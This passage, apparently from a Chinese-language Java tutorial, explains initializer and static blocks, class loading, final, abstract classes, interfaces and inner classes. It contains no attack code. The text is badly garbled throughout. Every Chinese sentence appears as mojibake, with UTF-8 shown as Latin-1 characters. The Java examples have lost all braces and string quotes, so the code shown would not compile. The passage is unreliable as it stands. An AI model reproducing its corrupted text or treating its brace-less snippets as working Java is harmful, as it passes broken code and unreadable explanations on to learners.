å™¨éƒ½æœ‰ç›¸åŒçš„è¯­å¥//(2) è¿™æ ·ä»£ç çœ‹èµ·æ¥æ¯”è¾ƒå†—ä½™//(3) è¿™æ—¶æˆ‘ä»¬å¯ä»¥æŠŠç›¸åŒçš„è¯­å¥ï¼Œæ”¾å…¥åˆ°ä¸€ä¸ªä»£ç å—ä¸­ï¼Œå³å¯//(4) è¿™æ ·å½“æˆ‘ä»¬ä¸ç®¡è°ƒç”¨å“ªä¸ªæ„é€ å™¨ï¼Œåˆ›å»ºå¯¹è±¡ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ä»£ç å—çš„å†…å®¹//(5) ä»£ç å—è°ƒç”¨çš„é¡ºåºä¼˜å…ˆäºæ„é€ å™¨System.out.println(ç”µå½±å±å¹•æ‰“å¼€...);System.out.println(å¹¿å‘Šå¼€å§‹...);System.out.println(ç”µå½±æ­£æ˜¯å¼€å§‹...);;public Movie(String name) System.out.println(Movie(String name) è¢«è°ƒç”¨...);this.name = name;public Movie(String name, double price) this.name = name;this.price = price;public Movie(String name, double price, String director) System.out.println(Movie(String name, double price, String director) è¢«è°ƒç”¨...);this.name = name;this.price = price;this.director = director; staticä»£ç å—ä¹Ÿå«åšé™æ€ä»£ç å—ï¼Œä½œç”¨æ˜¯å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œéšç±»çš„åŠ è½½è€Œæ‰§è¡Œï¼Œå¹¶ä¸”åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè€Œæ™®é€šçš„ä»£ç å—æ²¡åˆ›å»ºä¸€ä¸ªå¯¹è±¡å°±æ‰§è¡Œ é‚£ä¹ˆç±»ä»€ä¹ˆæ—¶å€™ä¼šè¢«åŠ è½½å‘¢ åˆ›å»ºç±»çš„å®ä¾‹æ—¶ï¼š å½“ä½ ä½¿ç”¨ new å…³é”®å­—åˆ›å»ºä¸€ä¸ªç±»çš„å¯¹è±¡æ—¶ï¼ŒJVM ä¼šå…ˆæ£€æŸ¥è¯¥ç±»æ˜¯å¦å·²åŠ è½½ã€‚å¦‚æœæ²¡æœ‰åŠ è½½ï¼Œåˆ™ä¼šè§¦å‘ç±»çš„åŠ è½½ã€‚ ç¤ºä¾‹ï¼š MyClass obj = new MyClass(); // åˆ›å»ºå¯¹è±¡ï¼ŒåŠ è½½ MyClass ç±» è®¿é—®ç±»çš„é™æ€æˆå‘˜ï¼ˆé™æ€å˜é‡æˆ–é™æ€æ–¹æ³•ï¼‰æ—¶ï¼š å½“ä½ è®¿é—®ä¸€ä¸ªç±»çš„é™æ€å˜é‡æˆ–è°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œå¦‚æœç±»å°šæœªåŠ è½½ï¼ŒJVM ä¼šåŠ è½½è¯¥ç±»ã€‚ ç¤ºä¾‹ï¼š System.out.println(MyClass.staticVariable); // è®¿é—®é™æ€å˜é‡ï¼ŒåŠ è½½ MyClass ç±»MyClass.staticMethod(); // è°ƒç”¨é™æ€æ–¹æ³•ï¼ŒåŠ è½½ MyClass ç±» ç±»çš„åˆå§‹åŒ–ï¼ˆé™æ€ä»£ç å—ï¼‰ï¼š ç±»åœ¨åŠ è½½æ—¶ï¼Œé™æ€ä»£ç å—ä¼šè¢«æ‰§è¡Œã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨é™æ€æˆå‘˜è¢«è®¿é—®æˆ–ç±»è¢«å®ä¾‹åŒ–ä¹‹å‰ã€‚ ç¤ºä¾‹ï¼š class MyClass static System.out.println(MyClass loaded); // ä»»ä½•è®¿é—® MyClass çš„æ“ä½œéƒ½ä¼šè§¦å‘é™æ€ä»£ç å—çš„æ‰§è¡Œ å­ç±»åˆå§‹åŒ–æ—¶ï¼š å½“ä¸€ä¸ªå­ç±»è¢«åˆå§‹åŒ–æ—¶ï¼Œå¦‚æœå…¶çˆ¶ç±»å°šæœªè¢«åŠ è½½ï¼Œé‚£ä¹ˆçˆ¶ç±»ä¼šå…ˆè¢«åŠ è½½ã€‚ ç¤ºä¾‹ï¼š class Parent static System.out.println(Parent loaded); class Child extends Parent static System.out.println(Child loaded); public class Main public static void main(String[] args) new Child(); // åŠ è½½é¡ºåºï¼šå…ˆåŠ è½½ Parent ç±»ï¼Œå†åŠ è½½ Child ç±» finalå…³é”®å­—final å…³é”®å­—çš„ç”¨æ³• ç”¨äºç±»ï¼ˆfinal classï¼‰ï¼š å«ä¹‰ï¼šå¦‚æœä¸€ä¸ªç±»è¢«å£°æ˜ä¸º finalï¼Œåˆ™ä¸èƒ½è¢«ç»§æ‰¿ã€‚è¿™æ„å‘³ç€æ²¡æœ‰å…¶ä»–ç±»å¯ä»¥æ‰©å±•è¿™ä¸ªç±»ã€‚ ç”¨é€”ï¼šä½¿ç”¨ final ç±»é€šå¸¸æ˜¯ä¸ºäº†ç¡®ä¿è¯¥ç±»çš„å®ç°ä¸ä¼šè¢«æ›´æ”¹æˆ–æ‰©å±•ã€‚ä¾‹å¦‚ï¼Œjava.lang.String ç±»å°±æ˜¯ä¸€ä¸ª final ç±»ï¼Œå®ƒä¸èƒ½è¢«ç»§æ‰¿ã€‚ ç¤ºä¾‹ public final class Constants // è¯¥ç±»ä¸èƒ½è¢«ç»§æ‰¿ ç”¨äºæ–¹æ³•ï¼ˆfinal methodï¼‰ï¼š å«ä¹‰ï¼šå¦‚æœä¸€ä¸ªæ–¹æ³•è¢«å£°æ˜ä¸º finalï¼Œåˆ™å­ç±»ä¸èƒ½é‡å†™è¿™ä¸ªæ–¹æ³•ã€‚ ç”¨é€”ï¼šä½¿ç”¨ final æ–¹æ³•é€šå¸¸æ˜¯ä¸ºäº†é˜²æ­¢å­ç±»æ›´æ”¹æ–¹æ³•çš„æ ¸å¿ƒè¡Œä¸ºï¼Œç¡®ä¿æ–¹æ³•çš„åŠŸèƒ½ä¿æŒä¸å˜ã€‚ ç¤ºä¾‹ class Parent public final void display() System.out.println(This is a final method.); class Child extends Parent // ä¸‹é¢çš„ä»£ç ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼Œå› ä¸º final æ–¹æ³•ä¸èƒ½è¢«é‡å†™ // public void display() // System.out.println(Attempt to override.); // ç”¨äºå˜é‡ï¼ˆfinal variableï¼‰ï¼š å«ä¹‰ï¼šå¦‚æœä¸€ä¸ªå˜é‡è¢«å£°æ˜ä¸º finalï¼Œåˆ™å®ƒçš„å€¼ä¸€æ—¦è¢«åˆå§‹åŒ–ï¼Œå°±ä¸èƒ½å†æ›´æ”¹ã€‚ ç”¨é€” å¯¹äº åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ intã€char ç­‰ï¼‰ï¼Œfinal å˜é‡çš„å€¼åœ¨åˆå§‹åŒ–åä¸å¯å˜ã€‚ å¯¹äº å¼•ç”¨æ•°æ®ç±»å‹ï¼ˆå¦‚å¯¹è±¡ã€æ•°ç»„ï¼‰ï¼Œfinal å˜é‡çš„å¼•ç”¨åœ¨åˆå§‹åŒ–åä¸å¯æ›´æ”¹ï¼ˆå³ä¸èƒ½æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œä½†å¯¹è±¡çš„å†…å®¹å¯ä»¥æ”¹å˜ã€‚ ç¤ºä¾‹ final int MAX_VALUE = 100; // åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå€¼ä¸èƒ½æ›´æ”¹final Person person = new Person(John);// person = new Person(Doe); // é”™è¯¯ï¼šä¸èƒ½æ”¹å˜å¼•ç”¨person.setName(Doe); // åˆæ³•ï¼šå¯¹è±¡å†…å®¹å¯ä»¥æ”¹å˜ ç‰¹åˆ«è¯´æ˜ final å’Œç±»åŠ è½½çš„ä¼˜åŒ–ï¼š JVM å’Œç¼–è¯‘å™¨å¯ä»¥åˆ©ç”¨ final å…³é”®å­—è¿›è¡Œä¼˜åŒ–ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª final å˜é‡çš„å€¼æ˜¯å·²çŸ¥çš„ï¼Œå¯ä»¥åœ¨ç¼–è¯‘æ—¶å†…è”ï¼ˆinliningï¼‰ï¼Œä»è€Œæé«˜æ€§èƒ½ã€‚ final å’Œä¸å¯å˜å¯¹è±¡ï¼š ä½¿ç”¨ final å…³é”®å­—æ˜¯åˆ›å»ºä¸å¯å˜å¯¹è±¡çš„é‡è¦æ­¥éª¤ä¹‹ä¸€ã€‚ä¸å¯å˜å¯¹è±¡çš„æ‰€æœ‰å­—æ®µéƒ½åº”è¯¥æ˜¯ finalï¼Œä»¥ç¡®ä¿å…¶çŠ¶æ€åœ¨æ„é€ åä¸ä¼šæ”¹å˜ã€‚ final å‚æ•°ï¼š æ–¹æ³•çš„å‚æ•°ä¹Ÿå¯ä»¥ç”¨ final å£°æ˜ï¼Œè¿™æ„å‘³ç€åœ¨æ–¹æ³•ä¸­ä½ ä¸èƒ½æ›´æ”¹å‚æ•°çš„å¼•ç”¨ã€‚ ç¤ºä¾‹ï¼š public void display(final String message) // message = New Message; // é”™è¯¯ï¼šä¸èƒ½æ›´æ”¹ `final` å‚æ•° System.out.println(message); final å’Œå¤šçº¿ç¨‹å®‰å…¨æ€§ï¼š åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œfinal å˜é‡å¯ä»¥ç¡®ä¿å˜é‡åœ¨å¯¹è±¡æ„é€ å®Œæˆåè¢«å®‰å…¨åœ°å‘å¸ƒç»™å…¶ä»–çº¿ç¨‹ï¼Œå› ä¸º final å­—æ®µåœ¨å¯¹è±¡æ„é€ å®Œæˆåæ˜¯å¯è§çš„ã€‚ æ€»ç»“ final ç±»ä¸èƒ½è¢«ç»§æ‰¿ã€‚ final æ–¹æ³•ä¸èƒ½è¢«é‡å†™ã€‚ final å˜é‡çš„å€¼åœ¨åˆå§‹åŒ–åä¸èƒ½è¢«æ›´æ”¹ã€‚ final æ˜¯åˆ›å»ºä¸å¯å˜ç±»å’Œæä¾›çº¿ç¨‹å®‰å…¨çš„ä¸€ç§å¸¸è§æŠ€æœ¯ã€‚ æŠ½è±¡ç±» å½“çˆ¶ç±»çš„æŸäº›æ–¹æ³•éœ€è¦å£°æ˜ä½†åˆä¸ç¡®å®šå¦‚ä½•å®ç°æ—¶ï¼Œå¯ä»¥å…ˆå°†å…¶å£°æ˜ä¸ºæŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æŠ½è±¡ç±»ï¼Œç”¨abstractå…³é”®å­—æ¥å£°æ˜ è¯­æ³•ï¼šè®¿é—®ä¿®é¥°ç¬¦ abstract ç±»å ç”¨abstractå…³é”®å­—æ¥ä¿®é¥°ä¸€ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³• è¯­æ³•ï¼šè®¿é—®ä¿®é¥°ç¬¦ abstract è¿”å›ç±»å‹ æ–¹æ³•å(å‚æ•°åˆ—è¡¨);//æ²¡æœ‰æ–¹æ³•ä½“ æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š æŠ½è±¡ç±»ä¸èƒ½å¤Ÿè¢«å®ä¾‹åŒ– æŠ½è±¡ç±»å¯ä»¥æ²¡æœ‰abstractæ–¹æ³• ä¸€æ—¦ç±»è¢«å£°æ˜ä¸ºabstractæ–¹æ³•ï¼Œåˆ™è¿™ä¸ªç±»å¿…é¡»å£°æ˜ä¸ºabstract abstractåªèƒ½å¤Ÿä¿®é¥°ç±»å’Œæ–¹æ³•ï¼Œä¸èƒ½ä¿®é¥°å±æ€§å’Œå…¶ä»–çš„ ä¸€ä¸ªç±»ç»§æ‰¿äº†æŠ½è±¡ç±»ï¼Œåˆ™å®ƒå¿…é¡»å®ç°æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œé™¤éå®ƒè‡ªå·±ä¹Ÿå£°æ˜ä¸ºabstractç±» æŠ½è±¡æ–¹æ³•ä¸èƒ½å¤Ÿç”¨private,finalå’Œstaticæ¥ä¿®é¥°ï¼Œè¿™äº›å…³é”®å­—éƒ½æ˜¯å’Œé‡å†™ç›¸è¿èƒŒçš„ æ¥å£åŸºç¡€æ¥å£å°±æ˜¯ç»™å‡ºä¸€äº›æ²¡æœ‰å®ç°çš„æ–¹æ³•ï¼Œå°è£…åˆ°ä¸€èµ·ï¼Œåœ¨æ ¹æ®å…·ä½“æƒ…å†µæŠŠè¿™äº›æ–¹æ³•å†™å‡ºæ¥ è¯­æ³•å¦‚ä¸‹ï¼š interface æ¥å£å\t//å±æ€§\t//æŠ½è±¡æ–¹æ³•class ç±»å implements æ¥å£\tè‡ªå·±å±æ€§;\tè‡ªå·±æ–¹æ³•;\tå¿…é¡»å®ç°çš„æ¥å£çš„æŠ½è±¡æ–¹æ³• é‚£ä¹ˆä»€ä¹ˆæ—¶å€™ä½¿ç”¨æ¥å£å‘¢ï¼Œä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼šç°åœ¨è¦åˆ¶é€ æˆ˜æ–—æœºï¼Œæ­¦è£…ç›´å‡æœºï¼Œä¸“å®¶åªéœ€è¦å°†é£æœºæ‰€éœ€çš„åŠŸèƒ½è§„æ ¼å®šä¸‹æ¥å³å¯ï¼Œå‰©ä¸‹çš„äº¤ç»™åˆ«äººå®ç°å°±å¯ä»¥äº†ã€ ä¸‹é¢æ¥ä¸ªç®€å•çš„ä»£ç ä¾‹å­ï¼šDBInterface.java package show;public interface DBInterface //é¡¹ç›®ç»ç† public void connect();//è¿æ¥æ–¹æ³• public void close();//å…³é—­è¿æ¥ MysqlDB.java package show;public class MysqlDB implements DBInterface @Override public void connect() System.out.println(Connecting to MysqlDB); @Override public void close() System.out.println(Closing MysqlDB); New.java import show.MysqlDB;public class New public static void main(String[] args) MysqlDB mysqlDB = new MysqlDB(); mysqlDB.connect(); mysqlDB.close(); æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„çš„ æ¥å£çš„å¤šæ€ç‰¹æ€§ å¤šæ€å‚æ•°ï¼šæ¥å£çš„å¤šæ€å‚æ•°æŒ‡çš„æ˜¯åœ¨æ–¹æ³•å®šä¹‰ä¸­ï¼Œä½¿ç”¨æ¥å£ç±»å‹ä½œä¸ºå‚æ•°ã€‚ç”±äºJavaä¸­æ¥å£å¯ä»¥è¢«å¤šä¸ªç±»å®ç°ï¼Œå› æ­¤åœ¨æ–¹æ³•ä¸­å¯ä»¥ä¼ å…¥ä»»ä½•å®ç°äº†è¯¥æ¥å£çš„ç±»çš„å¯¹è±¡ï¼Œä»è€Œå®ç°äº†å¤šæ€æ€§ åœ¨Javaä¸­ï¼Œçˆ¶ç±»ï¼ˆæˆ–æ¥å£ï¼‰ç±»å‹çš„å¼•ç”¨å¯ä»¥æŒ‡å‘ä»»ä½•å­ç±»ï¼ˆæˆ–å®ç°ç±»ï¼‰çš„å¯¹è±¡ï¼Œå¹¶ä¸”è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šæ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹æ‰§è¡Œå¯¹åº”çš„æ–¹æ³• // å®šä¹‰ä¸€ä¸ªæ¥å£interface Animal void sound();// å®ç°æ¥å£çš„ç¬¬ä¸€ä¸ªç±»class Dog implements Animal @Override public void sound() System.out.println(Dog barks); // å®ç°æ¥å£çš„ç¬¬äºŒä¸ªç±»class Cat implements Animal @Override public void sound() System.out.println(Cat meows); // ä¸€ä¸ªä½¿ç”¨æ¥å£ä½œä¸ºå‚æ•°çš„æ–¹æ³•class Zoo public void makeSound(Animal animal) animal.sound();// åŠ¨æ€ç»‘å®šåˆ°å…·ä½“å¯¹è±¡çš„å®ç° public class Main public static void main(String[] args) Zoo zoo = new Zoo(); Dog dog = new Dog(); Cat cat = new Cat(); zoo.makeSound(dog); // è¾“å‡º Dog barks zoo.makeSound(cat); // è¾“å‡º Cat meows å¤šæ€æ•°ç»„ æ¥å£å­˜åœ¨å¤šæ€ä¼ é€’ç°è±¡ public class InterfacePolyPass public static void main(String[] args) //æ¥å£ç±»å‹çš„å˜é‡å¯ä»¥æŒ‡å‘å®ç°äº†è¯¥æ¥å£çš„ç±»çš„å¯¹è±¡å®ä¾‹ IG ig = new Teacher();//å¦‚æœ IG ç»§æ‰¿äº† IH æ¥å£ï¼Œè€Œ Teacher ç±»å®ç°äº† IG æ¥å£//é‚£ä¹ˆï¼Œå®é™…ä¸Šå°±ç›¸å½“äº Teacher ç±»ä¹Ÿå®ç°äº† IH æ¥å£. //è¿™å°±æ˜¯æ‰€è°“çš„ æ¥å£å¤šæ€ä¼ é€’ç°è±¡. IH ih = new Teacher(); interface IH void hi();interface IG extends IH class Teacher implements IG @Override public void hi() å†…éƒ¨ç±»åŸºç¡€ä¸€ä¸ªç±»å†…éƒ¨å®Œæ•´åœ°åµŒå¥—å¦ä¸€ä¸ªç±»ï¼Œè¢«åµŒå¥—çš„ç±»ç§°ä¸ºå†…éƒ¨ç±»ï¼ŒåµŒå¥—å…¶ä»–ç±»çš„ç±»ç§°ä¸ºå¤–éƒ¨ç±» å†…éƒ¨ç±»çš„æœ€å¤§ç‰¹ç‚¹å°±æ˜¯å¯ä»¥ç›´æ¥è®¿é—®ç§æœ‰å±æ€§ class Outer//å¤–éƒ¨ç±»\tclass Inner\t//å†…éƒ¨ç±»clas Other//å¤–éƒ¨å…¶ä»–ç±» ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚ä¸‹ class Outer //å¤–éƒ¨ç±»\tprivate int n1 = 100;//å±æ€§\tpublic Outer(int n1) //æ„é€ å™¨ this.n1 = n1; public void m1() //æ–¹æ³• System.out.println(m1()); //ä»£ç å— System.out.println(ä»£ç å—...); class Inner //å†…éƒ¨ç±», åœ¨ Outer ç±»çš„å†…éƒ¨ å†…éƒ¨ç±»çš„åˆ†ç±»å®šä¹‰åœ¨å¤–éƒ¨ç±»å±€éƒ¨ä½ç½®ä¸Šï¼ˆæ¯”å¦‚æ–¹æ³•å†…ï¼‰å±€éƒ¨å†…éƒ¨ç±» å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®ï¼Œæ¯”å¦‚æ–¹æ³•ä¸­ï¼Œå¹¶ä¸”æœ‰ç±»å å¯ä»¥ç›´æ¥è®¿é—®æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬ç§æœ‰æˆå‘˜ ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œå› ä¸ºå®ƒå…¶å®å°±æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œä½†å¯ä»¥ä½¿ç”¨finalæ¥ä¿®é¥° ä»…ä»…ä½œç”¨äºå®šä¹‰å®ƒçš„æ–¹æ³•æˆ–ä»£ç å—ä¸­ å¤–éƒ¨ç±»è®¿é—®å†…éƒ¨ç±»çš„æˆå‘˜çš„è¯è¦åˆ›å»ºå¯¹è±¡æ¥è®¿é—® å¤–éƒ¨å…¶ä»–ç±»ä¸èƒ½è®¿é—®å±€éƒ¨å†…éƒ¨ç±» å¦‚æœå¤–éƒ¨ç±»å’Œå±€éƒ¨å†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼Œéµå®ˆå°±è¿‘åŸåˆ™ï¼Œå¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜çš„è¯ï¼Œå¯ä»¥ç”¨å¤–éƒ¨ç±»å.this.æˆå‘˜æ¥è®¿é—® public class LocalInnerClass //\tpublic static void main(String[] args) Outer02 outer02 = new Outer02(); outer02.m1(); System.out.println(outer02 çš„ hashcode= + outer02);\tclass Outer02 //å¤–éƒ¨ç±»\tprivate int n1 = 100;\tprivate void m2() System.out.println(Outer02 m2());\t//ç§æœ‰æ–¹æ³•\tpublic void m1() //æ–¹æ³•\t//1.å±€éƒ¨å†…éƒ¨ç±»æ˜¯å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®,é€šå¸¸åœ¨æ–¹æ³•\t//3.ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦,ä½†æ˜¯å¯ä»¥ä½¿ç”¨ final ä¿®é¥°\t//4.ä½œç”¨åŸŸ : ä»…ä»…åœ¨å®šä¹‰å®ƒçš„æ–¹æ³•æˆ–ä»£ç å—ä¸­ final class Inner02 //å±€éƒ¨å†…éƒ¨ç±»(æœ¬è´¨ä»ç„¶æ˜¯ä¸€ä¸ªç±») //2.å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„ private int n1 = 800; public void f1() //5. å±€éƒ¨å†…éƒ¨ç±»å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œæ¯”å¦‚ä¸‹é¢ å¤–éƒ¨ç±» n1 å’Œ m2() //7. å¦‚æœå¤–éƒ¨ç±»å’Œå±€éƒ¨å†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼Œé»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™ï¼Œå¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œ // ä½¿ç”¨ å¤–éƒ¨ç±»å.this.æˆå‘˜ï¼‰å»è®¿é—® // Outer02.this æœ¬è´¨å°±æ˜¯å¤–éƒ¨ç±»çš„å¯¹è±¡, å³å“ªä¸ªå¯¹è±¡è°ƒç”¨äº† m1, Outer02.this å°±æ˜¯å“ªä¸ªå¯¹è±¡ System.out.println(n1= + n1 + å¤–éƒ¨ç±»çš„ n1= + Outer02.this.n1); System.out.println(Outer02.this hashcode= + Outer02.this); m2(); //6. å¤–éƒ¨ç±»åœ¨æ–¹æ³•ä¸­ï¼Œå¯ä»¥åˆ›å»º Inner02 å¯¹è±¡ï¼Œç„¶åè°ƒç”¨æ–¹æ³•å³å¯ Inner02 inner02 = new Inner02(); inner02.f1(); åŒ¿åå†…éƒ¨ç±»çš„ä½¿ç”¨ï¼ˆé‡è¦ï¼‰ å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®ï¼Œæ¯”å¦‚æ–¹æ³•ä¸­ï¼Œå¹¶ä¸”æ²¡æœ‰ç±»å new ç±»æˆ–æ¥å£(å‚æ•°åˆ—è¡¨)\tç±»ä½“; åŒ¿åå†…éƒ¨ç±»çš„ç‰¹ç‚¹ï¼š æ²¡æœ‰åå­—ï¼šåŒ¿åå†…éƒ¨ç±»æ²¡æœ‰åå­—ï¼Œä¸èƒ½åœ¨å…¶ä»–åœ°æ–¹å¼•ç”¨å®ƒï¼Œåªèƒ½åœ¨å£°æ˜æ—¶ä½¿ç”¨ã€‚ é€šå¸¸ç”¨äºç®€åŒ–ä»£ç ï¼šç‰¹åˆ«æ˜¯å½“ä½ åªéœ€è¦ä¸€ä¸ªç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶ä¸”è¯¥ç±»ä¸éœ€è¦è¢«é‡å¤ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ç”¨åŒ¿åå†…éƒ¨ç±»ã€‚å®ƒé€šå¸¸ç”¨æ¥å®ç°æ¥å£æˆ–è€…ç»§æ‰¿ç±»ï¼Œä»¥æä¾›ç‰¹å®šçš„å®ç°ã€‚ åªèƒ½åˆ›å»ºä¸€æ¬¡å®ä¾‹ï¼šåŒ¿åå†…éƒ¨ç±»çš„åˆ›å»ºä¸å®ä¾‹åŒ–æ˜¯åœ¨åŒä¸€ä¸ªåœ°æ–¹å®Œæˆçš„ï¼Œå› æ­¤ä¸èƒ½åœ¨å¤šä¸ªåœ°æ–¹é‡å¤ä½¿ç”¨è¯¥ç±»ã€‚ è¯­æ³•ç®€æ´ï¼šåŒ¿åå†…éƒ¨ç±»å…è®¸åœ¨ä»£ç ä¸­å®šä¹‰ä¸€ä¸ªç±»çš„åŒæ—¶åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹ï¼Œçœå»äº†ä¸ºç±»å•ç‹¬å‘½åå’Œå®šä¹‰çš„éº»çƒ¦ ä¾‹å­å¦‚ä¸‹ï¼š public class Main public static void main(String[] args) // åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œä½¿ç”¨åŒ¿åå†…éƒ¨ç±»æ¥å®ç°Runnableæ¥å£ Runnable runnable = new Runnable() @Override public void run() System.out.println(çº¿ç¨‹æ­£åœ¨è¿è¡Œ...); ; Thread thread = new Thread(runnable);//åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹å¯¹è±¡ thread.start(); å†ä¸¾ä¸€ä¸ªä¾‹å­å¦‚ä¸‹ï¼š public class New public static void main(String[] args) //å½“åšå®å‚ç›´æ¥ä¼ é€’ï¼Œç®€æ´é«˜æ•ˆ f1(new IL() @Override public void show() System.out.println(è¿™æ˜¯ä¸€å‰¯åç”»~~...); );//ä¼ ç»Ÿæ–¹æ³• f1(new Picture()); //é™æ€æ–¹æ³•,å½¢å‚æ˜¯æ¥å£ç±»å‹ public static void f1(IL il) il.show(); //æ¥å£interface IL void show();//ç±»-å®ç° IL = ç¼–ç¨‹é¢†åŸŸ (ç¡¬ç¼–ç )class Picture implements IL @Override public void show() System.out.println(è¿™æ˜¯ä¸€å‰¯åç”» XX...); æˆå‘˜å†…éƒ¨ç±» å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„æˆå‘˜ä½ç½®ä¸Šï¼Œå¹¶ä¸”æ²¡æœ‰staticä¿®é¥° å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬ç§æœ‰çš„ å¯ä»¥æ·»åŠ ä»»æ„è®¿é—®ä¿®é¥°ç¬¦ï¼Œå› ä¸ºå®ƒçš„åœ°ä½å°±æ˜¯ä¸€ä¸ªæˆå‘˜ ä½œç”¨åŸŸå’Œå¤–éƒ¨ç±»çš„å…¶ä»–æˆå‘˜ä¸€æ ·ï¼Œéƒ½ä¸ºæ•´ä¸ªç±»ä½“ å½“å¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»é‡åçš„æ—¶å€™ï¼Œå†…éƒ¨ç±»è®¿é—®æ—¶éµå®ˆå°±è¿‘åŸåˆ™ï¼Œæƒ³è®¿é—®å¤–éƒ¨ç±»æˆå‘˜ï¼Œå¯ä»¥ä½¿ç”¨å¤–éƒ¨ç±»å.this.æˆå‘˜æ¥è®¿é—® public class New public static void main(String[] args) Outer08 outer08 = new Outer08(); outer08.t1();//å¤–éƒ¨å…¶ä»–ç±»ï¼Œä½¿ç”¨æˆå‘˜å†…éƒ¨ç±»çš„ä¸‰ç§æ–¹å¼// ç¬¬ä¸€ç§æ–¹å¼// outer08.new Inner08(); ç›¸å½“äºæŠŠ new Inner08()å½“åšæ˜¯ outer08 æˆå‘˜// è¿™å°±æ˜¯ä¸€ä¸ªè¯­æ³•ï¼Œä¸è¦ç‰¹åˆ«çš„çº ç»“. Outer08.Inner08 inner08 = outer08.new Inner08(); inner08.say();// ç¬¬äºŒæ–¹å¼ åœ¨å¤–éƒ¨ç±»ä¸­ï¼Œç¼–å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è¿”å› Inner08 å¯¹è±¡ Outer08.Inner08 inner08Instance = outer08.getInner08Instance(); inner08Instance.say(); class Outer08 //å¤–éƒ¨ç±» private int n1 = 10; public String name = å¼ ä¸‰; private void hi() System.out.println(hi()æ–¹æ³•...); //1.æ³¨æ„: æˆå‘˜å†…éƒ¨ç±»ï¼Œæ˜¯å®šä¹‰åœ¨å¤–éƒ¨å†…çš„æˆå‘˜ä½ç½®ä¸Š//2.å¯ä»¥æ·»åŠ ä»»æ„è®¿é—®ä¿®é¥°ç¬¦(publicã€protected ã€é»˜è®¤ã€private),å› ä¸ºå®ƒçš„åœ°ä½å°±æ˜¯ä¸€ä¸ªæˆå‘˜ public class Inner08 //æˆå‘˜å†…éƒ¨ç±» private double sal = 99.8; private int n1 = 66; public void say() //å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„//å¦‚æœæˆå‘˜å†…éƒ¨ç±»çš„æˆå‘˜å’Œå¤–éƒ¨ç±»çš„æˆå‘˜é‡åï¼Œä¼šéµå®ˆå°±è¿‘åŸåˆ™. //ï¼Œå¯ä»¥é€šè¿‡ å¤–éƒ¨ç±»å.this.å±æ€§ æ¥è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ System.out.println(n1 = + n1 + name = + name + å¤–éƒ¨ç±»çš„ n1= + Outer08.this.n1); hi(); //æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ª Inner08 å®ä¾‹ public Inner08 getInner08Instance() return new Inner08(); //å†™æ–¹æ³• public void t1() //ä½¿ç”¨æˆå‘˜å†…éƒ¨ç±»//åˆ›å»ºæˆå‘˜å†…éƒ¨ç±»çš„å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ç›¸å…³çš„æ–¹æ³• Inner08 inner08 = new Inner08(); inner08.say(); System.out.println(inner08.sal); é™æ€å†…éƒ¨ç±» å®šä¹‰åœ¨å¤–éƒ¨ç±»æˆå‘˜ä½ç½®ï¼Œå¹¶æœ‰staticä¿®é¥° 